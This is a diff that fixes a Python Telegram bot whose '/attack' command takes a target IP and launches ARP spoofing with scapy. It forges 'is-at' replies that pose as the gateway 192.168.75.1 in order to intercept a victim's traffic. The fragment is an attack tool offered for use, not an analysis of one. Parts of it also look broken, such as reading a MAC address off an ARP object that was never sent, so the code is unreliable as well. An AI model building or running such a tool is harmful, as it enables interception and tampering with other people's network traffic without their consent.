@@ -9,9 +9,7 @@ a = 1
 
 ipg = '192.168.75.1'
 
-IP = range(1)
-
-GATEWAY = range(1)
+IP, GATEWAY = range(2)
 
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -43,7 +41,7 @@ def attack(update, context):
 
 def set_ip(update, context):
   
-    ip = update.message.reply_text
+    ip = update.message.text.strip()
 
     logger.info(f'ARP spoofing iniciado para {ip}')
 
@@ -51,7 +49,8 @@ def set_ip(update, context):
     gateway_ip = ipg
 
     try:
-        target_mac = ARP().hwsrc
+        arp = ARP(pdst=target_ip)
+        target_mac = arp.hwsrc
         gateway_mac = ARP(pdst=gateway_ip).hwsrc
 
         packet_target = Ether(dst=target_mac)/ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, pdst=target_ip)
@@ -79,7 +78,6 @@ conv_handler = ConversationHandler(
     entry_points=[CommandHandler('attack', attack)],
   
     states={
-      
         IP: [MessageHandler(None, set_ip)]
     },
   
